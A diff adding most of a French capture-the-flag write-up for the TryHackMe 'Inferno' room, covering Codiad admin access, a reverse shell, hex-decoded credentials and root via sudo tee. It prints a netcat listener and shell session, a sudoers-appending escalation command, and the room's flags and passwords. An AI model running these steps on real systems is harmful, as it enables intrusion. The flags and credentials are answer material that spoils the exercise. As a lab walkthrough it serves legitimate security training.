@@ -173,3 +173,132 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-10 23:33:
 ```
 
 Avec hydra on trouve les identifiants qui sont : admin:dante1
+
+![page3](./Task1-03.png) 
+
+Avec les identiants, on arrive sur l'interface d'administration.
+En lisant le fichier README.md on sait que c'est un framework qui est codiad.   
+
+![page4](./Task1-04.png) 
+
+On met un reverse shell, sur le chemin inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF.  
+
+```bash
+tim@kali:~/Bureau/tryhackme$ nc -lvnp 1234
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+```
+
+On écoute le port 1234 pour avoir le shell.   
+
+![page5](./Task1-05.png) 
+
+On lance le reverse-shell.   
+
+```bash
+tim@kali:~/Bureau/tryhackme$ nc -lvnp 1234
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.142.149.
+Ncat: Connection from 10.10.142.149:32992.
+Linux Inferno 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 19:34:35 up 51 min,  0 users,  load average: 0.00, 0.00, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ cd /home/dante/Downloads
+$ ls -al
+total 4420
+drwxr-xr-x  2 root  root     4096 Jan 11  2021 .
+drwxr-xr-x 13 dante dante    4096 Jan 11  2021 ..
+-rw-r--r--  1 root  root     1511 Nov  3  2020 .download.dat
+-rwxr-xr-x  1 root  root   137440 Jan 11  2021 CantoI.docx
+-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoII.docx
+-rwxr-xr-x  1 root  root    88280 Jan 11  2021 CantoIII.docx
+-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoIV.docx
+-rwxr-xr-x  1 root  root   133792 Jan 11  2021 CantoIX.docx
+-rwxr-xr-x  1 root  root    43224 Jan 11  2021 CantoV.docx
+-rwxr-xr-x  1 root  root   133792 Jan 11  2021 CantoVI.docx
+-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoVII.docx
+-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoX.docx
+-rwxr-xr-x  1 root  root   121432 Jan 11  2021 CantoXI.docx
+-rwxr-xr-x  1 root  root   149080 Jan 11  2021 CantoXII.docx
+-rwxr-xr-x  1 root  root   216256 Jan 11  2021 CantoXIII.docx
+-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoXIV.docx
+-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoXIX.docx
+-rwxr-xr-x  1 root  root    88280 Jan 11  2021 CantoXV.docx
+-rwxr-xr-x  1 root  root   137440 Jan 11  2021 CantoXVI.docx
+-rwxr-xr-x  1 root  root   121432 Jan 11  2021 CantoXVII.docx
+-rwxr-xr-x  1 root  root  2351792 Jan 11  2021 CantoXVIII.docx
+-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoXX.docx
+$ cat .download.dat 
+c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a
+```
+
+Dans /home/dante/downloads/ on trouve un fichier .download.dat.  
+Le contenue est un message en hexadecimal.   
+
+![page6](./Task1-06.png) 
+
+On décode le message et on trouve un identifiant.  
+
+**Locate and find local.txt**
+
+```bash
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+su dante
+Password: V1rg1l10h3lpm3
+dante@Inferno:~/Downloads$ cd ..
+cat local.txt
+77f6f3c544ec0811e2d1243e2e0d1835
+```
+
+On se connecte sur dante et on lit le fichier local.txt.  
+Le flag est : 77f6f3c544ec0811e2d1243e2e0d1835  
+
+**Locate and find proof.txt**
+
+```bash
+dante@Inferno:~$ sudo -l
+sudo -l
+Matching Defaults entries for dante on Inferno:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dante may run the following commands on Inferno:
+    (root) NOPASSWD: /usr/bin/tee
+```
+
+On peut exécuter tee avec les droits root.    
+
+```bash
+tim@kali:~/Bureau/tryhackme/write-up/GTFOBLookup$ python gtfoblookup.py gtfobins search tee
+tee:
+...
+sudo:
+
+Code: LFILE=file_to_write
+echo DATA | sudo tee -a "$LFILE"
+...
+```
+
+On trouve un exploit pour écrire dans un fichier avec tee. 
+
+```bash
+dante@Inferno:~$ echo "ALL ALL=NOPASSWD: ALL"|sudo tee -a /etc/sudoers
+sudo /bin/bash -p
+cat /root/proof.txt
+Congrats!
+
+You've rooted Inferno!
+
+f332678ed0d0767d7434b8516a7c6144
+
+mindsflee
+```
+
+On configure sudo pour qu'il exécute tout avec les droits root.    
+On lit le fichier proof.txt et on a le flag : f332678ed0d0767d7434b8516a7c6144   
+
